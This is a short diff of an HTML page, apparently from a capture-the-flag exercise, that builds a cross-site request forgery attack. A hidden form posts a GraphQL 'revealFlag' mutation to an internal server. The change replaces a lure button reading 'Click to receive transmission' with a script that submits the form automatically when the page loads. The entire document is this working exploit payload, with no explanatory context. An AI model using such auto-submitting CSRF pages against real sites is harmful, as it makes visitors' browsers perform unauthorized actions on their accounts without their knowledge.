@@ -11,8 +11,8 @@
     <form id="csrfForm" action="http://100.86.236.104:4001/graphql" method="POST">
         <input type="hidden" name="query" value='mutation { revealFlag }'>
     </form>
-	
-    <button onclick="document.getElementById('csrfForm').submit()">Click to receive transmission</button>
-
+    <script>
+        document.getElementById("csrfForm").submit();
+    </script>
 </body>
 </html>
